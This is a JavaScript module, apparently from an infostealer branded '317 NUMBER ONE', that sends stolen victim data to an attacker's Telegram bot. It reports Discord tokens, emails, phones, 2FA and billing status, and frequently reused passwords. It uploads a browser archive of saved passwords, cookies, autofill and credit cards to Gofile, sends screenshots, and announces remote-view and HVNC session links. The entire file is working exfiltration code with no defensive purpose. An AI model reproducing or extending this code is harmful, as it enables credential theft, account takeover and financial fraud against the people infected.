// 317 NUMBER ONE - Telegram Bot Exfiltration
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const { sanitizeJSON, snowflakeToDate } = require('../utils/system');
const { smartUpload } = require('../utils/gofile');

/**
 * Send data to Telegram bot
 */
async function sendToTelegram(botToken, chatId, validAccounts, systemInfo, topPasswords, zipFilePath) {
    try {
        // Send Discord Intelligence messages (one per account)
        if (validAccounts.length === 0) {
            await sendDiscordIntelligence(botToken, chatId, null, systemInfo, 1, 1);
        } else {
            for (let i = 0; i < validAccounts.length; i++) {
                await sendDiscordIntelligence(
                    botToken, 
                    chatId, 
                    validAccounts[i], 
                    systemInfo, 
                    i + 1, 
                    validAccounts.length
                );
                
                // Rate limit protection
                if (i < validAccounts.length - 1) {
                    await sleep(1000);
                }
            }
        }
        
        // Send System Intelligence
        await sleep(1000);
        await sendSystemIntelligence(botToken, chatId, systemInfo, topPasswords);
        
        // Upload browser data ZIP to Gofile and send link
        if (zipFilePath && fs.existsSync(zipFilePath)) {
            await sleep(1000);
            
            const stats = fs.statSync(zipFilePath);
            const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);
            
            console.log(`[Telegram] Uploading browser data (${sizeMB} MB)...`);
            
            const uploadResult = await smartUpload(zipFilePath, 'Browser-Datas.zip');
            
            if (uploadResult.success) {
                // Send upload link
                let message = '💎 <b>317 NUMBER ONE — BROWSER DATA ARCHIVE</b>\n';
                message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
                message += `<blockquote>📁 <b>Filename:</b> <code>${uploadResult.filename}</code>\n`;
                message += `💾 <b>Size:</b> <code>${uploadResult.size} MB</code>\n`;
                message += `🔗 <b>Download Link:</b>\n${uploadResult.link}</blockquote>\n\n`;
                message += `<i>317 · System: ${systemInfo.username}</i>`;
                
                await sendMessage(botToken, chatId, message);
                console.log('[Telegram] Browser data link sent successfully');
            } else {
                // Fallback: Try sending as document if upload fails
                console.log('[Telegram] Upload failed, trying direct upload...');
                try {
                    await sendDocument(botToken, chatId, zipFilePath, '📦 Browser Data Archive (Direct Upload)');
                } catch (error) {
                    console.error('[Telegram] Direct upload also failed:', error.message);
                }
            }
        }
        
        return true;
    } catch (error) {
        console.error('[Telegram] Upload failed:', error.message);
        return false;
    }
}

/**
 * Send Discord Intelligence message
 */
async function sendDiscordIntelligence(botToken, chatId, account, systemInfo, index, total) {
    const header = total > 1 
        ? `💎 <b>317 NUMBER ONE — DISCORD INTELLIGENCE [${index}/${total}]</b>`
        : '💎 <b>317 NUMBER ONE — DISCORD INTELLIGENCE</b>';
    
    let message = `${header}\n`;
    message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    if (!account) {
        message += '<blockquote>🔑 <b>Token:</b> <code>Not Found</code>\n';
        message += '👤 <b>Username:</b> <code>Unknown</code>\n';
        message += '🆔 <b>ID:</b> <code>Unknown</code></blockquote>\n\n';
    } else {
        message += `<blockquote>🔑 <b>Token:</b>\n<code>${escapeHTML(account.token)}</code>\n\n`;
        message += `👤 <b>Username:</b> <code>${escapeHTML(account.username)}</code>\n`;
        message += `🆔 <b>ID:</b> <code>${escapeHTML(account.id)}</code>\n`;
        message += `✅ <b>Verified:</b> <code>${escapeHTML(account.verified)}</code>\n`;
        message += `📧 <b>Email:</b> <code>${escapeHTML(account.email)}</code>\n`;
        message += `📱 <b>Phone:</b> <code>${escapeHTML(account.phone)}</code>\n`;
        message += `🔐 <b>2FA:</b> <code>${escapeHTML(account.mfa)}</code>\n`;
        message += `🎖 <b>Badges:</b> <code>${escapeHTML(account.badges)}</code>\n`;
        message += `💳 <b>Billing:</b> <code>${escapeHTML(account.billing)}</code>\n`;
        message += `🎨 <b>Decorations:</b> <code>${escapeHTML(account.decorations)}</code>\n`;
        message += `📅 <b>Created:</b> <code>${escapeHTML(snowflakeToDate(account.id))}</code>\n`;
        message += `🌍 <b>IP:</b> <code>${escapeHTML(systemInfo.ip)}</code>\n`;
        message += `🚩 <b>Country:</b> <code>${escapeHTML(systemInfo.country)}</code></blockquote>\n\n`;
    }
    
    message += `<i>317 · System: ${escapeHTML(systemInfo.username)}</i>`;
    
    await sendMessage(botToken, chatId, message);
}

/**
 * Send System Intelligence message
 */
async function sendSystemIntelligence(botToken, chatId, systemInfo, topPasswords) {
    let message = '💎 <b>317 NUMBER ONE — SYSTEM INTELLIGENCE</b>\n';
    message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    message += '<blockquote><b>🔍 SYSTEM INFORMATION</b>\n';
    message += `🖥 <b>Computer:</b> <code>${escapeHTML(systemInfo.computerName)}</code>\n`;
    message += `👤 <b>User:</b> <code>${escapeHTML(systemInfo.username)}</code>\n`;
    message += `⚙️ <b>CPU:</b> <code>${escapeHTML(systemInfo.cpu.substring(0, 40))}...</code>\n`;
    message += `🎮 <b>GPU:</b> <code>${escapeHTML(systemInfo.gpu.substring(0, 40))}...</code>\n`;
    message += `💾 <b>RAM:</b> <code>${escapeHTML(systemInfo.ram)}</code>\n`;
    message += `🌐 <b>IP:</b> <code>${escapeHTML(systemInfo.ip)}</code>\n`;
    message += `🚩 <b>Country:</b> <code>${escapeHTML(systemInfo.country)}</code></blockquote>\n\n`;
    
    message += '<blockquote><b>🛡 SECURITY & SOFTWARE</b>\n';
    message += `🔒 <b>VPN:</b> ${systemInfo.vpn.includes('No VPN') ? '❌ Not Detected' : '✅ Detected'}\n`;
    message += `🌐 <b>Browsers:</b> ${systemInfo.browsers === '<a:no:1502431716403580969> \`None\`' ? '❌ None' : '✅ Installed'}\n`;
    message += `🎮 <b>Games:</b> ${systemInfo.games === '<a:no:1502431716403580969> \`None\`' ? '❌ None' : '✅ Installed'}\n`;
    message += `🎯 <b>Launchers:</b> ${systemInfo.launchers === '<a:no:1502431716403580969> \`None\`' ? '❌ None' : '✅ Installed'}\n`;
    message += `💰 <b>Wallets:</b> ${systemInfo.wallets === '<a:no:1502431716403580969> \`None\`' ? '❌ None' : '✅ Installed'}</blockquote>\n\n`;
    
    // Common passwords
    if (topPasswords.size > 0) {
        const sortedPasswords = Array.from(topPasswords.entries())
            .filter(([pw, count]) => count >= 2 && pw.length > 0)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 10); // Top 10
        
        if (sortedPasswords.length > 0) {
            message += '<blockquote><b>🔑 COMMON PASSWORDS</b>\n';
            for (const [password, count] of sortedPasswords) {
                message += `• <code>${escapeHTML(password)}</code> [x${count}]\n`;
            }
            message += '</blockquote>\n\n';
        }
    }
    
    message += '<blockquote><b>📦 EXFILTRATED DATA</b>\n';
    message += '<code>Browser-Datas.zip</code> contains:\n';
    message += '├─ 📁 Passwords\n';
    message += '├─ 📁 Cookies\n';
    message += '├─ 📁 Autofill Data\n';
    message += '└─ 📁 Credit Cards</blockquote>\n\n';
    
    message += `<i>317 · System: ${escapeHTML(systemInfo.username)}</i>`;
    
    await sendMessage(botToken, chatId, message);
}

/**
 * Send rare friends message
 */
async function sendRareFriends(botToken, chatId, rareFriends, systemInfo) {
    let message = '💎 <b>317 NUMBER ONE — RARE FRIENDS</b>\n';
    message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    
    message += `<blockquote><b>🎯 FOUND ${rareFriends.rareCount} RARE FRIENDS</b>\n\n`;
    
    if (rareFriends.rareList === '') {
        message += '❌ No rare friends detected.\n';
    } else {
        // Parse rare list and format for Telegram
        const friends = rareFriends.rareList.split('\\n').filter(f => f.trim());
        for (const friend of friends.slice(0, 25)) {
            // Remove Discord emoji IDs and format
            const cleanFriend = friend.replace(/<[^>]+>/g, '').trim();
            if (cleanFriend) {
                message += `• <code>${cleanFriend}</code>\n`;
            }
        }
    }
    
    message += `\n<b>📊 Total Friends:</b> <code>${rareFriends.totalFriends}</code></blockquote>\n\n`;
    
    message += `<i>317 · System: ${escapeHTML(systemInfo.username)}</i>`;
    
    await sendMessage(botToken, chatId, message);
}

/**
 * Send screenshot to Telegram
 */
async function sendScreenshot(botToken, chatId, screenshotPath, systemInfo) {
    try {
        // Check file exists and isn't too large (Telegram limit: 10MB for photos)
        const stats = fs.statSync(screenshotPath);
        const sizeMB = stats.size / (1024 * 1024);
        
        const caption = `💎 <b>317 NUMBER ONE — SCREENSHOT LOG</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n<blockquote>👤 <b>User:</b> <code>${systemInfo.username}</code>\n🖥 <b>Computer:</b> <code>${systemInfo.computerName}</code>\n⏰ <b>Time:</b> <code>${new Date().toLocaleString()}</code></blockquote>\n\n<i>317 · System: ${systemInfo.username}</i>`;
        
        if (sizeMB > 10) {
            // Too large for photo, send as document
            await sendDocument(botToken, chatId, screenshotPath, caption);
        } else {
            await sendPhoto(botToken, chatId, screenshotPath, caption);
        }
        return true;
    } catch (error) {
        console.error('[Telegram] Screenshot upload failed:', error.message);
        // Try sending as document as fallback
        try {
            await sendDocument(botToken, chatId, screenshotPath, '📸 Screenshot');
            return true;
        } catch {
            return false;
        }
    }
}

/**
 * Send text message
 */
async function sendMessage(botToken, chatId, text) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        })
    });
    
    if (!response.ok) {
        const error = await response.text();
        throw new Error(`Telegram API error: ${error}`);
    }
    
    return await response.json();
}

/**
 * Send document
 */
async function sendDocument(botToken, chatId, filePath, caption) {
    const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
    
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('document', fs.createReadStream(filePath));
    if (caption) {
        form.append('caption', caption);
        form.append('parse_mode', 'HTML');
    }
    
    const response = await fetch(url, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
    });
    
    if (!response.ok) {
        const error = await response.text();
        throw new Error(`Telegram API error: ${error}`);
    }
    
    return await response.json();
}

/**
 * Send photo
 */
async function sendPhoto(botToken, chatId, photoPath, caption) {
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
    
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('photo', fs.createReadStream(photoPath));
    if (caption) {
        form.append('caption', caption.substring(0, 1024)); // Telegram caption limit
        // Only use HTML parse mode if caption contains HTML tags
        if (caption.includes('<') && caption.includes('>')) {
            form.append('parse_mode', 'HTML');
        }
    }
    
    const response = await fetch(url, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
    });
    
    if (!response.ok) {
        const error = await response.text();
        throw new Error(`Telegram API error: ${error}`);
    }
    
    return await response.json();
}

/**
 * Escape HTML for Telegram
 */
function escapeHTML(text) {
    if (!text) return '';
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

/**
 * Sleep utility
 */
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Send Stream Session notification to Telegram
 */
async function sendStreamSession(botToken, chatId, streamInfo, systemInfo) {
    const viewUrl = streamInfo.viewUrl || `http://${systemInfo.ip}:${streamInfo.port}/${streamInfo.agentId}`;
    
    let message = `<blockquote>🖥️ <b>317 NUMBER ONE — Stream Session</b>\n\n`;
    message += `✅ <b>Status:</b> <code>Online</code>\n`;
    message += `🆔 <b>ID:</b> <code>${escapeHTML(streamInfo.agentId)}</code>\n`;
    message += `🔗 <b>View:</b> <a href="${escapeHTML(viewUrl)}">Click to View!</a></blockquote>\n\n`;
    message += `<i>317 · ${escapeHTML(systemInfo.username)}</i>`;
    
    await sendMessage(botToken, chatId, message);
}

/**
 * Send HVNC Session notification to Telegram
 */
async function sendHvncSession(botToken, chatId, hvncInfo, systemInfo) {
    const panelUrl = hvncInfo.viewUrl || `http://${systemInfo.ip || '0.0.0.0'}:7317/${hvncInfo.agentId}/hvnc`;
    
    let message = `<blockquote>🖥️ <b>317 NUMBER ONE — HVNC Session</b>\n\n`;
    message += `✅ <b>Status:</b> <code>Active</code>\n`;
    message += `🆔 <b>ID:</b> <code>${escapeHTML(hvncInfo.agentId)}</code>\n`;
    message += `🖥️ <b>Desktop:</b> <code>${escapeHTML(hvncInfo.desktopName)}</code>\n`;
    message += `🔗 <b>Panel:</b> <a href="${escapeHTML(panelUrl)}">Click to Open!</a></blockquote>\n\n`;
    message += `<i>317 · ${escapeHTML(systemInfo.username)}</i>`;
    
    await sendMessage(botToken, chatId, message);
}

module.exports = {
    sendToTelegram,
    sendRareFriends,
    sendScreenshot,
    sendStreamSession,
    sendHvncSession
};
